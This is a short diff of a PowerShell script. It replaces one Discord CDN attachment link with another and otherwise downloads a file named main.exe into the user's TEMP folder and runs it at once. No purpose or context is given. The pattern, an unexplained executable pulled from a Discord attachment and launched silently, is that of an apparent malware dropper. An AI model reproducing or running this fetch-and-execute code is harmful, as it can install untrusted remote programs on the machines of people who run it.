@@ -1,4 +1,4 @@
-$url = "https://cdn.discordapp.com/attachments/1239366779504164935/1239366912643829780/main.exe?ex=6642a9e2&is=66415862&hm=50cdee8e6e521e0d855ee428185efa3f26772e50e4d1826a2e45ecea04574398&"
+$url = "https://cdn.discordapp.com/attachments/1239366779504164935/1241441323471605851/main.exe?ex=664a35d4&is=6648e454&hm=d292600e391d19e06dc642973b91e84bc04bf48345b1624332e959ebb9afb1af&"
 $file = Join-Path $env:TEMP "main.exe"
 Invoke-WebRequest -Uri $url -OutFile $file
 Start-Process $file
